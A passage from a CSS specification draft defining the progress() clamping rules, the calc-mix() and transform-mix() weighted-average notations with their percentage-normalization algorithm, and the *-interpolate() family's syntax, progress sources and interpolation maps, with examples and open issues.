<a id="ref-for-progress-start-value③"></a>

<a id="ref-for-valdef-progress-no-clamp"></a>

<code><c->(</c-><a href="#progress-value">progress value</a> - <a href="#progress-start-value">progress start value</a><c->)</c-> / <c->(</c-><a href="#progress-end-value">progress end value</a> - <span>progress start value</span><c->)</c-></code>, clamped to the \[0,1\] range if [no-clamp](#valdef-progress-no-clamp) is not specified.

<a id="ref-for-progress-end-value③"></a>

<a id="ref-for-progress-start-value④"></a>

If the [progress start value](#progress-start-value) and [progress end value](#progress-end-value) are the same value

<a id="ref-for-valdef-progress-no-clamp①"></a>

0 if [no-clamp](#valdef-progress-no-clamp) is not specified.

<a id="ref-for-progress-value②"></a>

Otherwise, 0, -∞, or +∞, depending on whether [progress value](#progress-value) is equal to, less than, or greater than the shared value.

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-997f0423"></a> Do we need a percent-progress() notation, or do enough places auto-convert that it’s not necessary?

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-c1472b24"></a> Should progress() functions clamp to 0-100%? [\[Issue \#11825\]](https://github.com/w3c/csswg-drafts/issues/11825)

<a id="ref-for-funcdef-progress⑤"></a>

<a id="ref-for-funcdef-calc"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [progress()](#funcdef-progress) function is essentially syntactic sugar for a particular pattern of [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) notations.

## <a id="mixing"></a>6.  Weighted Average Notations: the \*-mix() family

<a id="ref-for-functional-notation③"></a>

Several <a id="mix-notations"></a>mix notations in CSS allow representing the weighted average of a set of values. These [functional notations](https://drafts.csswg.org/css-values-4/#functional-notation) follow the syntactic pattern:

<a id="ref-for-mult-zero-plus③"></a>

<a id="ref-for-mult-zero-plus④"></a>

<a id="ref-for-mult-opt②"></a>

<a id="ref-for-comb-comma②"></a>

<a id="ref-for-comb-all④"></a>

<a id="ref-for-percentage-value⑤"></a>

<a id="ref-for-mult-opt③"></a>

<a id="ref-for-mult-comma"></a>

```text
*mix() = *mix( options? , [ value && <percentage>? ]# )
```
<a id="ref-for-percentage-value⑥"></a>

where the <var>options</var> can provide type-specific mixing options, and each <var>value</var> and optional [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) pair in the argument list is a <a id="mix-item"></a>mix item representing an input to the mix and its weight in the average.

<a id="ref-for-mix-notations①"></a>

The [mix notations](#mix-notations) in CSS include:

- <a id="ref-for-funcdef-calc-mix"></a>

  <a id="ref-for-number-value③"></a>

  <a id="ref-for-length-value⑤"></a>

  <a id="ref-for-percentage-value⑦"></a>

  <a id="ref-for-time-value"></a>

  <a id="ref-for-funcdef-calc①"></a>

  [calc-mix()](#funcdef-calc-mix), for mixing [\<number\>](https://drafts.csswg.org/css-values-4/#number-value), [\<length\>](https://drafts.csswg.org/css-values-4/#length-value), [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value), [\<time\>](https://drafts.csswg.org/css-values-4/#time-value), and other dimensions representable in [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) expressions

- <a id="ref-for-funcdef-transform-mix"></a>

  <a id="ref-for-typedef-transform-list"></a>

  [transform-mix()](#funcdef-transform-mix), for mixing [\<transform-list\>](https://drafts.csswg.org/css-transforms-1/#typedef-transform-list)s

- <a id="ref-for-funcdef-color-mix"></a>

  <a id="ref-for-typedef-color①"></a>

  [color-mix()](https://drafts.csswg.org/css-color-5/#funcdef-color-mix), for mixing [\<color\>](https://drafts.csswg.org/css-color-5/#typedef-color) values (see [\[css-color-5\]](#biblio-css-color-5))

- <a id="ref-for-funcdef-cross-fade"></a>

  <a id="ref-for-typedef-image"></a>

  [cross-fade()](https://drafts.csswg.org/css-images-4/#funcdef-cross-fade), for mixing [\<image\>](https://drafts.csswg.org/css-images-3/#typedef-image) values (see [\[css-images-4\]](#biblio-css-images-4))

- <a id="ref-for-funcdef-palette-mix"></a>

  <a id="ref-for-propdef-font-palette"></a>

  [palette-mix()](https://drafts.csswg.org/css-fonts-4/#funcdef-palette-mix), for mixing [font-palette](https://drafts.csswg.org/css-fonts-4/#propdef-font-palette) values (see [\[css-fonts-4\]](#biblio-css-fonts-4))

### <a id="mix-percentage-normalization"></a>6.1.  Normalizing Mix Percentages

<a id="ref-for-percentage-value⑧"></a>

<a id="ref-for-mix-notations②"></a>

If the sum of the mix percentages are greater than 100%, they are scaled down; if it is less, any remaining percentage is distributed to values whose [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) is omitted, or else assigned to a “none” type value as defined by the specific [mix notation](#mix-notations).

To <a id="normalize-mix-percentages"></a>normalize mix percentages given

- <a id="ref-for-list②"></a>

  <a id="ref-for-mix-item"></a>

  a [list](https://infra.spec.whatwg.org/#list) of [mix items](#mix-item) <var>items</var> (a value and optional percentage, each between 0% and 100% if specified)

- an optional <var>force normalization</var> flag (defaulting to false),

<a id="ref-for-mix-item①"></a>

returning a list of [mix items](#mix-item) with normalized percentages and a “leftover” percentage:

1.  Let <var>specified sum</var> be the sum of the percentages specified in <var>items</var> (clamped to 100%), or 0% if the percentages are omitted for all items.

2.  For each omitted percentage in <var>items</var>, set it to <code><c->(</c-><c->100</c-><c->%</c-> - <var>specified sum</var><c->)</c-> / <c->(</c->number of omitted percentages<c->)</c-></code>.

3.  Let <var>total</var> be the sum of the percentages of all the items.

4.  If <var>total</var> is greater than 100%, or if <var>total</var> is greater than 0% and the <var>force normalization</var> flag is true, multiply every percentage in <var>items</var> by <code><c->(</c-><c->100</c-><c->%</c-> / <var>total</var><c->)</c-></code>.

5.  If <var>total</var> is less than 100%, let <var>leftover</var> be <code><c->(</c-><c->100</c-><c->%</c-> - <var>total</var><c->)</c-></code>. Otherwise, let <var>leftover</var> be 0%.

6.  Return <var>items</var> and <var>leftover</var>.

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: At the end of this algorithm, every percentage is set, and the sum of all percentages is either 0% (if they were all specified as 0% to begin with) or 100%. The <var>leftover</var> value will be applied to the usage-specific “none” type value mixed into the final result.

### <a id="mix-resolution"></a>6.2.  Mix Resolution

<a id="ref-for-used-value"></a>

<a id="ref-for-mix-notations③"></a>

The [used value](https://drafts.csswg.org/css-cascade-5/#used-value) of a valid [mix notation](#mix-notations) is the weighted average of its arguments, as specified by the specific notation.

<a id="ref-for-computed-value③"></a>

<a id="ref-for-used-value①"></a>

<a id="ref-for-mix-notations④"></a>

The [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) is the [used value](https://drafts.csswg.org/css-cascade-5/#used-value) if it is possible to calculate. Otherwise, it is the [mix notation](#mix-notations) itself, with its arguments computed individually.

<a id="ref-for-funcdef-calc-mix①"></a>

### <a id="calc-mix"></a>6.3.  Weighted Average of Numeric and Dimensional Values: the [calc-mix()](#funcdef-calc-mix) notation

<a id="ref-for-mix-notations⑤"></a>

<a id="ref-for-funcdef-calc②"></a>

<a id="ref-for-math-function②"></a>

The <a id="funcdef-calc-mix"></a>calc-mix() [mix notation](#mix-notations) represents a weighted average of numeric or dimensional value. Like [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc), it is a [math function](https://drafts.csswg.org/css-values-4/#math-function), with the following syntactic form:

<a id="ref-for-funcdef-calc-mix②"></a>

<a id="ref-for-typedef-calc-sum④"></a>

<a id="ref-for-percentage-value⑨"></a>

<a id="ref-for-mult-opt④"></a>

<a id="ref-for-mult-comma①"></a>

```text
<calc-mix()> = calc-mix( [ <calc-sum> <percentage [0,100]>? ]# )
```
<a id="ref-for-typedef-calc-sum⑤"></a>

<a id="ref-for-number-value④"></a>

<a id="ref-for-typedef-dimension①"></a>

<a id="ref-for-percentage-value①⓪"></a>

<a id="ref-for-css-consistent-type②"></a>

<a id="ref-for-css-make-a-type-consistent①"></a>

The [\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) arguments can resolve to any [\<number\>](https://drafts.csswg.org/css-values-4/#number-value), [\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension), or [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value), but must have a [consistent type](https://drafts.csswg.org/css-values-4/#css-consistent-type) or else the function is invalid. The result’s type will be the <a id="ref-for-css-consistent-type③"></a>consistent type, [made consistent](https://drafts.csswg.org/css-values-4/#css-make-a-type-consistent) with the type of the <a id="ref-for-typedef-calc-sum⑥"></a>\<calc-sum\> values.

<a id="ref-for-used-value②"></a>

<a id="ref-for-funcdef-calc-mix③"></a>

<a id="ref-for-typedef-calc-sum⑦"></a>

<a id="ref-for-percentage-value①①"></a>

<a id="ref-for-normalize-mix-percentages"></a>

The [used value](https://drafts.csswg.org/css-cascade-5/#used-value) of a valid [calc-mix()](#funcdef-calc-mix) is the result of producing a weighted average of its [\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) values, with the weight of each item given by its corresponding [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) after [normalizing these mix percentages](#normalize-mix-percentages). (Any “leftover” mix percentage is applied to a consistently-typed zero value, and thus effectively discarded.)

<a id="ref-for-computed-value④"></a>

<a id="ref-for-funcdef-calc-mix④"></a>

<a id="ref-for-used-value③"></a>

<a id="ref-for-typedef-calc-sum⑧"></a>

<a id="ref-for-percentage-value①②"></a>

The [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) of a valid [calc-mix()](#funcdef-calc-mix) is its [used value](https://drafts.csswg.org/css-cascade-5/#used-value) if all of the [\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) and [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) values in it can be resolved, and is a <a id="ref-for-funcdef-calc-mix⑤"></a>calc-mix() notation with each of its <a id="ref-for-typedef-calc-sum⑨"></a>\<calc-sum\> and <a id="ref-for-percentage-value①③"></a>\<percentage\> values computed individually otherwise.

<a id="ref-for-funcdef-transform-mix①"></a>

### <a id="transform-mix"></a>6.4.  Weighted Average of Transform Values: the [transform-mix()](#funcdef-transform-mix) notation

<a id="ref-for-mix-notations⑥"></a>

<a id="ref-for-typedef-transform-list①"></a>

The <a id="funcdef-transform-mix"></a>transform-mix() [mix notation](#mix-notations) represents a weighted average of [\<transform-list\>](https://drafts.csswg.org/css-transforms-1/#typedef-transform-list), with the following syntactic form:

<a id="ref-for-funcdef-transform-mix②"></a>

<a id="ref-for-typedef-transform-list②"></a>

<a id="ref-for-comb-all⑤"></a>

<a id="ref-for-percentage-value①④"></a>

<a id="ref-for-mult-comma②"></a>

```text
<transform-mix()> = transform-mix( [ <transform-list> && <percentage [0,100]> ]# )
```
<a id="ref-for-used-value④"></a>

<a id="ref-for-funcdef-transform-mix③"></a>

<a id="ref-for-typedef-transform-list③"></a>

<a id="ref-for-percentage-value①⑤"></a>

<a id="ref-for-normalize-mix-percentages①"></a>

<a id="ref-for-identity-transform-function"></a>

The [used value](https://drafts.csswg.org/css-cascade-5/#used-value) of a valid [transform-mix()](#funcdef-transform-mix) is the result of producing a weighted average of its [\<transform-list\>](https://drafts.csswg.org/css-transforms-1/#typedef-transform-list) values, with the weight of each item given by its corresponding [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) after [normalizing these mix percentages](#normalize-mix-percentages). Any “leftover” mix percentage is applied to an [identity transform](https://drafts.csswg.org/css-transforms-1/#identity-transform-function) appended to the list. The weighting can be calculated by interpolating each <a id="ref-for-typedef-transform-list④"></a>\<transform-list\> using its <a id="ref-for-percentage-value①⑥"></a>\<percentage\> weight as the interpolation progress from the <a id="ref-for-identity-transform-function①"></a>identity transform towards the <a id="ref-for-typedef-transform-list⑤"></a>\<transform-list\>. See [CSS Transforms 1 § 9 Interpolation of Transforms](https://drafts.csswg.org/css-transforms-1/#interpolation-of-transforms).

<a id="ref-for-percentage-value①⑦"></a>

<a id="ref-for-typedef-transform-list⑥"></a>

<a id="ref-for-computed-value⑤"></a>

<a id="ref-for-used-value⑤"></a>

<a id="ref-for-funcdef-transform-mix④"></a>

If every [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) weight can be fully resolved, and the [\<transform-list\>](https://drafts.csswg.org/css-transforms-1/#typedef-transform-list)s can be interpolated without used-value-time information, then the [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) is the [used value](https://drafts.csswg.org/css-cascade-5/#used-value); it is otherwise the [transform-mix()](#funcdef-transform-mix) notation itself with its arguments each computed according to their type.

<a id="ref-for-funcdef-transform-mix⑤"></a>

<a id="ref-for-typedef-transform-function"></a>

[transform-mix()](#funcdef-transform-mix) is, itself, a [\<transform-function\>](https://drafts.csswg.org/css-transforms-2/#typedef-transform-function).

## <a id="interpolation-notation"></a>7.  Interpolation Mapping Notations: the \*-interpolate() family

<a id="ref-for-functional-notation④"></a>

Several <a id="interpolation-notations"></a>interpolation notations in CSS allow representing an interpolated value corresponding to a certain amount of <a id="interpolation-progress"></a>interpolation progress along a defined scale or mapping function (the <a id="interpolation-map"></a>interpolation map). The [functional notations](https://drafts.csswg.org/css-values-4/#functional-notation) follow the syntactic pattern:

<a id="ref-for-mult-zero-plus⑤"></a>

<a id="ref-for-mult-zero-plus⑥"></a>

<a id="ref-for-comb-all⑥"></a>

<a id="ref-for-mult-opt⑤"></a>

<a id="ref-for-comb-comma③"></a>

<a id="ref-for-comb-comma④"></a>

<a id="ref-for-mult-opt⑥"></a>

<a id="ref-for-comb-comma⑤"></a>

<a id="ref-for-mult-comma③"></a>

```text
*interpolate() = *interpolate( [ progress && global-options? ],
                               stop, [  between-options? , stop ]# )
```
Where:

- <a id="ref-for-interpolation-map"></a>

  <var>progress</var> specifies the input position into the [interpolation map](#interpolation-map); see [§ 7.1.1 Specifying the Interpolation Progress](#interpolation-progress-arguments)

- <var>global-options</var> specifies additional options for the interpolation as a whole, and defaults for the between-stop interpolation options.

- <a id="ref-for-interpolation-stop"></a>

  <var>stop</var> represents an [interpolation stop](#interpolation-stop); see [§ 7.1.2 Defining the Interpolation Map](#interpolation-map-arguments)

- <var>between-options</var> specifies options for the interpolation between the two surrounding stops.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-28bcfd83"></a> For example, the following changes the background color of an element depending on the width of the viewport:
>
> ```text
> background: color-interpolate(100vw in lch,
>   200px: palegoldenrod,
>   800px: palegreen,
>   2000px: powderblue
> );
> ```
>
> - <a id="ref-for-valdef-color-palegoldenrod"></a>
>
>   Below 200px, the color is [palegoldenrod](https://drafts.csswg.org/css-color-4/#valdef-color-palegoldenrod);
>
> - <a id="ref-for-valdef-lch-lch"></a>
>
>   <a id="ref-for-valdef-color-palegoldenrod①"></a>
>
>   <a id="ref-for-valdef-color-palegreen"></a>
>
>   From 200px to 800px, the color interpolates in [lch](https://drafts.csswg.org/css-color-4/#valdef-lch-lch) from [palegoldenrod](https://drafts.csswg.org/css-color-4/#valdef-color-palegoldenrod) to [palegreen](https://drafts.csswg.org/css-color-4/#valdef-color-palegreen);
>
> - <a id="ref-for-valdef-lch-lch①"></a>
>
>   <a id="ref-for-valdef-color-palegreen①"></a>
>
>   <a id="ref-for-valdef-color-powderblue"></a>
>
>   From 800px to 2000px, the color interpolate in [lch](https://drafts.csswg.org/css-color-4/#valdef-lch-lch) from [palegreen](https://drafts.csswg.org/css-color-4/#valdef-color-palegreen) to [powderblue](https://drafts.csswg.org/css-color-4/#valdef-color-powderblue);
>
> - <a id="ref-for-valdef-color-powderblue①"></a>
>
>   Above 2000px, the color is [powderblue](https://drafts.csswg.org/css-color-4/#valdef-color-powderblue).

<a id="ref-for-propdef-font-size"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-0e16b33e"></a> In the following example, the font size interpolates from a smaller size on small screens to a larger size on large screens, easing along the interpolation curve. The author is storing the progress scale in a custom property to be able to re-use it across multiple [font-size](https://drafts.csswg.org/css-fonts-4/#propdef-font-size) declarations throughout the document.
>
> ```text
> html {
>   --font-scale: progress(100vw, 200px, 2000px) ease-in-out;
>   font-size: calc-interpolate(var(--font-scale),
>     0%: 16px,
>     70%: 20px,
>     100%: 24px);
> }
> h1 {
>   font-size: calc-interpolate(var(--font-scale),
>     0%: 1.2rem,
>     40%: 2rem,
>     100%: 3rem);
> }
> ```
>
> > <strong data-conversion-semantic="issue">Issue</strong>
> >
> > <a id="issue-afd5b308"></a> If anyone has better examples to punch in here let us know...

<a id="ref-for-interpolation-notations"></a>

The [interpolation notations](#interpolation-notations) in CSS include:

- <a id="ref-for-funcdef-calc-interpolate"></a>

  <a id="ref-for-number-value⑤"></a>

  <a id="ref-for-length-value⑥"></a>

  <a id="ref-for-percentage-value①⑧"></a>

  <a id="ref-for-time-value①"></a>

  <a id="ref-for-funcdef-calc③"></a>

  [calc-interpolate()](#funcdef-calc-interpolate), for interpolating [\<number\>](https://drafts.csswg.org/css-values-4/#number-value), [\<length\>](https://drafts.csswg.org/css-values-4/#length-value), [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value), [\<time\>](https://drafts.csswg.org/css-values-4/#time-value), and other dimensions representable in [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) expressions

- <a id="ref-for-funcdef-transform-interpolate"></a>

  <a id="ref-for-typedef-transform-list⑦"></a>

  [transform-interpolate()](#funcdef-transform-interpolate), for interpolating [\<transform-list\>](https://drafts.csswg.org/css-transforms-1/#typedef-transform-list)s

- <a id="ref-for-funcdef-color-interpolate"></a>

  <a id="ref-for-typedef-color②"></a>

  [color-interpolate()](#funcdef-color-interpolate), for interpolating [\<color\>](https://drafts.csswg.org/css-color-5/#typedef-color) values

<a id="ref-for-funcdef-interpolate"></a>

and finally the generic [interpolate()](#funcdef-interpolate) notation, which can represent the interpolation of any property’s values (but only the property’s entire value, not individual components).

<a id="ref-for-funcdef-interpolate①"></a>

<a id="ref-for-at-ruledef-keyframes"></a>

<a id="ref-for-component-value①"></a>

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-5ca864c6"></a> The [interpolate()](#funcdef-interpolate) notation also has a variant that takes a set of keyframes. It does this by referring to an [@keyframes](https://drafts.csswg.org/css-animations-1/#at-ruledef-keyframes) rule, and pulling the corresponding property declaration out of that. It would be nice to allow the other mix notations to take keyframe also, but how would we represent a set of keyframes for a [component value](https://drafts.csswg.org/css-syntax-3/#component-value) (rather than a full property value)?

<a id="ref-for-funcdef-palette-mix①"></a>

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-e25667f7"></a> Do we have enough use-cases to motivate adding palette-interpolate()? [palette-mix()](https://drafts.csswg.org/css-fonts-4/#funcdef-palette-mix) already handles transitions.

### <a id="interpolation-syntax"></a>7.1.  Global Syntax of the \*-interpolate() family

<a id="ref-for-interpolation-notations①"></a>

The generic syntax of the [interpolation notations](#interpolation-notations) is as follows:

<a id="ref-for-typedef-progress-source"></a>

<a id="ref-for-comb-all⑦"></a>

<a id="ref-for-typedef-easing-function"></a>

<a id="ref-for-mult-opt⑦"></a>

<a id="ref-for-comb-all⑧"></a>

<a id="ref-for-typedef-easing-function①"></a>

<a id="ref-for-mult-opt⑧"></a>

<a id="ref-for-comb-all⑨"></a>

<a id="ref-for-typedef-calc-interpolate-segment-options"></a>

<a id="ref-for-mult-opt⑨"></a>

<a id="ref-for-comb-comma⑥"></a>

<a id="ref-for-typedef-calc-interpolate-input-position"></a>

<a id="ref-for-mult-num-range"></a>

<a id="ref-for-typedef-calc-interpolate-input-position①"></a>

<a id="ref-for-comb-comma⑦"></a>

<a id="ref-for-typedef-easing-function②"></a>

<a id="ref-for-comb-any"></a>

<a id="ref-for-typedef-calc-interpolate-segment-options①"></a>

<a id="ref-for-mult-opt①⓪"></a>

<a id="ref-for-comb-comma⑧"></a>

<a id="ref-for-typedef-calc-interpolate-input-position②"></a>

<a id="ref-for-mult-num-range①"></a>

<a id="ref-for-typedef-calc-interpolate-input-position③"></a>

<a id="ref-for-mult-comma④"></a>

<a id="ref-for-mult-opt①①"></a>

```text
interpolate-function() = interpolate-function(
  [
    <progress-source> && [ by <easing-function> ]?
    && <easing-function>? && <segment-options>?
  ] ,
  <input-position>{1,2} : <output-value> ,
  [
    [ <easing-function> || <segment-options> ]? ,
    <input-position>{1,2} : <output-value>
  ]#?
)
```
<a id="ref-for-interpolation-progress"></a>

<a id="ref-for-interpolation-map①"></a>

These represent the [interpolation progress](#interpolation-progress) and [interpolation map](#interpolation-map) as described below.

#### <a id="interpolation-progress-arguments"></a>7.1.1.  Specifying the Interpolation Progress

<a id="ref-for-typedef-progress-source①"></a>

<a id="ref-for-interpolation-progress①"></a>

<a id="ref-for-interpolation-notations②"></a>

The <a id="typedef-progress-source"></a>[\<progress-source\>](#typedef-progress-source) value type represents the [interpolation progress](#interpolation-progress) in an [interpolation notation](#interpolation-notations). Its syntax is:

<a id="ref-for-typedef-progress-source②"></a>

<a id="ref-for-percentage-value①⑨"></a>

<a id="ref-for-comb-one⑨⓪"></a>

<a id="ref-for-number-value⑥"></a>

<a id="ref-for-comb-one⑨①"></a>

<a id="ref-for-typedef-dimension②"></a>

<a id="ref-for-comb-one⑨②"></a>

<a id="ref-for-propdef-animation-timeline"></a>

```text
<progress-source> = <percentage> | <number> | <dimension> | <'animation-timeline'>
```
where:

<a id="ref-for-percentage-value②⓪"></a>

<a id="valdef-progress-source-percentage"></a>[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value)

<a id="ref-for-interpolation-progress②"></a>

Represents the [interpolation progress](#interpolation-progress) as a percentage, with 0% computing to zero and 100% computing to 1.

<a id="ref-for-number-value⑦"></a>

<a id="valdef-progress-source-number"></a>[\<number\>](https://drafts.csswg.org/css-values-4/#number-value)

<a id="ref-for-interpolation-progress③"></a>

Represents the [interpolation progress](#interpolation-progress) as a number directly.

<a id="ref-for-funcdef-progress⑥"></a>

<a id="ref-for-math-function③"></a>

<a id="ref-for-number-value⑧"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This allows the use of the [progress()](#funcdef-progress) notations and other [math functions](https://drafts.csswg.org/css-values-4/#math-function) that output a [\<number\>](https://drafts.csswg.org/css-values-4/#number-value).

<a id="ref-for-typedef-dimension③"></a>

<a id="valdef-progress-source-dimension"></a>[\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension)

<a id="ref-for-interpolation-progress④"></a>

Represents the [interpolation progress](#interpolation-progress) as a dimension, which is converted to a number as specified in [§ 7.2 Validation and Normalization](#interpolation-normalization).

<a id="ref-for-typedef-dimension④"></a>

<a id="ref-for-typedef-progress-source③"></a>

<a id="ref-for-interpolation-map②"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Using a [\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension) value as [\<progress-source\>](#typedef-progress-source) requires at least some of the stops in the [interpolation map](#interpolation-map) to also use <a id="ref-for-typedef-dimension⑤"></a>\<dimension\> positions of the same type. See [§ 7.2 Validation and Normalization](#interpolation-normalization).

<a id="ref-for-propdef-animation-timeline①"></a>

<a id="valdef-progress-source-animation-timeline"></a>[\<'animation-timeline'\>](https://drafts.csswg.org/css-animations-2/#propdef-animation-timeline)

<a id="ref-for-valdef-animation-timeline-auto"></a>

<a id="ref-for-valdef-animation-timeline-none"></a>

<a id="ref-for-interpolation-progress⑤"></a>

Represents the [interpolation progress](#interpolation-progress) as the progress of the specified [animation timeline](https://drafts.csswg.org/web-animations-1/#timelines). The values [none](https://drafts.csswg.org/css-animations-2/#valdef-animation-timeline-none) and [auto](https://drafts.csswg.org/css-animations-2/#valdef-animation-timeline-auto) are invalid. [\[CSS-ANIMATIONS-2\]](#biblio-css-animations-2) [\[WEB-ANIMATIONS-2\]](#biblio-web-animations-2)

<a id="ref-for-interpolation-progress⑥"></a>

If the specified timeline does not exist on the element or otherwise doesn’t have a progress for some reason, this represents an [interpolation progress](#interpolation-progress) of 0.

<a id="ref-for-easing-function"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Progress values below 0/0% and above 1/100% are unconventional, and potentially awkward, but valid. For example, most [easing functions](https://drafts.csswg.org/css-easing-2/#easing-function), though they will accept any input, are defined in consideration of progress defined between the \[0,1\] (i.e. \[0%,100%\]) range.

<a id="ref-for-typedef-easing-function③"></a>

##### <a id="interpolation-progress-easing"></a>7.1.1.1.  Easing Interpolation Progress: the by [\<easing-function\>](https://drafts.csswg.org/css-easing-2/#typedef-easing-function) argument

<a id="ref-for-interpolation-progress⑦"></a>

<a id="ref-for-typedef-progress-source④"></a>

<a id="ref-for-typedef-easing-function④"></a>

<a id="ref-for-easing-function①"></a>

<a id="ref-for-interpolation-map③"></a>

<a id="ref-for-propdef-animation-timing-function"></a>

The [interpolation progress](#interpolation-progress) given by [\<progress-source\>](#typedef-progress-source) may be optionally modified by the [\<easing-function\>](https://drafts.csswg.org/css-easing-2/#typedef-easing-function) specified after the <a id="valdef-calc-interpolate-by"></a>by keyword. It applies the specified [easing function](https://drafts.csswg.org/css-easing-2/#easing-function) to the “timeline” of progress as a whole by modifying the <a id="ref-for-interpolation-progress⑧"></a>interpolation progress before it’s applied to the [interpolation map](#interpolation-map), analogous to [animation-timing-function](https://drafts.csswg.org/css-animations-1/#propdef-animation-timing-function).

<a id="ref-for-valdef-easing-function-linear"></a>

If omitted, defaults to [linear](https://www.w3.org/TR/css-easing-2/#valdef-easing-function-linear)

#### <a id="interpolation-map-arguments"></a>7.1.2.  Defining the Interpolation Map

<a id="ref-for-gradient-function"></a>

<a id="ref-for-interpolation-notations③"></a>

<a id="ref-for-interpolation-map④"></a>

<a id="ref-for-interpolation-stop①"></a>

<a id="ref-for-typedef-calc-interpolate-segment-options②"></a>

<a id="ref-for-typedef-easing-function⑤"></a>

Similar to the [gradient functions](https://drafts.csswg.org/css-images-4/#gradient-function), the [interpolation notations](#interpolation-notations) define an [interpolation map](#interpolation-map) using a stop list, associating <a id="input-positions"></a>input positions with <a id="output-values"></a>output values. Each <a id="interpolation-stop"></a>interpolation stop represents, essentially, a keyframe of the <a id="ref-for-interpolation-map⑤"></a>interpolation map: values between [interpolation stops](#interpolation-stop) are interpolated between these adjacent keyframes in accordance with the [\<segment-options\>](#typedef-calc-interpolate-segment-options) and [\<easing-function\>](https://drafts.csswg.org/css-easing-2/#typedef-easing-function) arguments applying between those keyframes.

<a id="ref-for-interpolation-map⑥"></a>

The [interpolation map](#interpolation-map) values are defined as follows:

<a id="ref-for-typedef-calc-interpolate-input-position④"></a>

<a id="typedef-calc-interpolate-input-position"></a>[\<input-position\>](#typedef-calc-interpolate-input-position){1,2} : <a id="ref-for-typedef-calc-interpolate-input-position⑤"></a>\<output-value\>

<a id="ref-for-typedef-calc-interpolate-input-position⑥"></a>

<a id="ref-for-gradient-function①"></a>

<a id="ref-for-output-values"></a>

<a id="ref-for-input-positions"></a>

<a id="ref-for-interpolation-stop②"></a>

Represents an [interpolation stop](#interpolation-stop) associating the specified [input position](#input-positions)(s) with the specified [output values](#output-values). As with the [gradient functions](https://drafts.csswg.org/css-images-4/#gradient-function), if two [\<input-position\>](#typedef-calc-interpolate-input-position)s are specified, it is treated the same as two stops with the same <a id="ref-for-typedef-calc-interpolate-input-position⑦"></a>\<output-value\>.

<a id="ref-for-typedef-calc-interpolate-input-position⑧"></a>

<a id="ref-for-percentage-value②①"></a>

<a id="ref-for-comb-one⑨③"></a>

<a id="ref-for-number-value⑨"></a>

<a id="ref-for-comb-one⑨④"></a>

<a id="ref-for-typedef-dimension⑥"></a>

```text
<input-position> = <percentage> | <number> | <dimension>
```
<a id="ref-for-typedef-calc-interpolate-input-position⑨"></a>

<a id="ref-for-typedef-progress-source⑤"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: [\<output-value\>](#typedef-calc-interpolate-input-position) is not given a grammar here, as the specific functions specify what their outputs are. <a id="ref-for-typedef-calc-interpolate-input-position①⓪"></a>\<input-position\>, however, is linked to [\<progress-source\>](#typedef-progress-source), see [§ 7.2.1 Type Checking](#interpolation-validity).

<a id="ref-for-typedef-easing-function⑥"></a>

<a id="valdef-calc-interpolate-easing-function"></a>[\<easing-function\>](https://drafts.csswg.org/css-easing-2/#typedef-easing-function)

<a id="ref-for-valdef-easing-function-linear①"></a>

<a id="ref-for-propdef-animation-timing-function①"></a>

<a id="ref-for-typedef-easing-function⑦"></a>

<a id="ref-for-easing-function②"></a>

When appearing in the first argument, specifies the “default” [easing function](https://drafts.csswg.org/css-easing-2/#easing-function) to be used between each stop. When appearing between stops, specifies the <a id="ref-for-easing-function③"></a>easing function to be used between the two surrounding stops, overriding any default provided by a global [\<easing-function\>](https://drafts.csswg.org/css-easing-2/#typedef-easing-function) argument. (It is analogous to [animation-timing-function](https://drafts.csswg.org/css-animations-1/#propdef-animation-timing-function).) If omitted, defaults to [linear](https://www.w3.org/TR/css-easing-2/#valdef-easing-function-linear).

<a id="ref-for-easing-function-input-progress-value"></a>

<a id="ref-for-easing-function④"></a>

<a id="ref-for-interpolation-progress⑨"></a>

<a id="ref-for-input-positions①"></a>

The [input progress value](https://drafts.csswg.org/css-easing-2/#easing-function-input-progress-value) to this [easing function](https://drafts.csswg.org/css-easing-2/#easing-function) is the <a id="segment-interpolation-progress"></a>segment interpolation progress—​how far the [interpolation progress](#interpolation-progress) is between the [input positions](#input-positions) of the nearest stops preceding and following it.

<a id="ref-for-interpolation-progress①⓪"></a>

<a id="ref-for-segment-interpolation-progress"></a>

<a id="ref-for-input-positions②"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-b56d90e8"></a> For example, in color-interpolate(20%, 0%: red, ease-in-out, 80%: green, 100%: blue), the 20% [interpolation progress](#interpolation-progress) becomes a 25% [segment interpolation progress](#segment-interpolation-progress), as 20% is 25% of the way between 0% and 80%, the surrounding [input positions](#input-positions).

